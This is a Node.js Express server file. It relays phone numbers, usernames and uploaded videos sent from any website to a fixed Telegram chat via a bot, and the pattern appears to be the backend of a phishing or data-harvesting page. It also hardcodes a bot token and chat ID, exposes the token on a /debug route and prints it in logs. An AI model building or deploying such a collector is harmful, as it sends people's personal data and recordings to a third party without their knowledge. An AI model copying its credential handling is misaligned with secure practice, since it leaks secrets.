const express = require("express");
const multer = require("multer");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

// =====================
// 📁 STORAGE
// =====================
const upload = multer({ dest: "uploads/" });

// =====================
// 🔑 CONFIG
// =====================
const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIREtQPUUTDVENOTXROc";
const CHAT_ID = "8280326139";

// =====================
// ❤️ WAKE ROUTE
// =====================
app.get("/", (req, res) => {
    res.send("Server is awake");
});
app.get("/debug", (req, res) => {
    res.json({
        token: BOT_TOKEN,
        length: BOT_TOKEN?.length
    });
});

// =====================
// 📞 SEND PHONE + USERNAME
// =====================
app.post("/send-phone", async (req, res) => {
    try {
        const { phone, username } = req.body;

        console.log("📞 Received:", phone, username);

        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: `📞 New User\n👤 Username: ${username}\n📱 Phone: ${phone}`
            }
        );

        res.send("Phone sent");

    } catch (err) {
        console.error("❌ Phone error:", err.response?.data || err.message);
        res.status(500).send("Failed");
    }
});

// =====================
// 🎥 VIDEO UPLOAD (MP4 LABEL)
// =====================
app.post("/upload", upload.single("video"), async (req, res) => {
    try {
        console.log("FILE:", req.file);

        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
            {
                chat_id: CHAT_ID,
                video: fs.createReadStream(req.file.path)
            },
            {
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }
        );

        console.log("TELEGRAM:", response.data);

        fs.unlink(req.file.path, () => {});

        res.json(response.data);

    } catch (err) {
        console.log("STATUS:", err.response?.status);
        console.log("DATA:", err.response?.data);
        res.status(500).json(err.response?.data || err.message);
    }
});

// =====================
// 🚀 START SERVER
// =====================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
    console.log("TOKEN RAW:", BOT_TOKEN);
    console.log("TOKEN LENGTH:", BOT_TOKEN?.length);
    
});
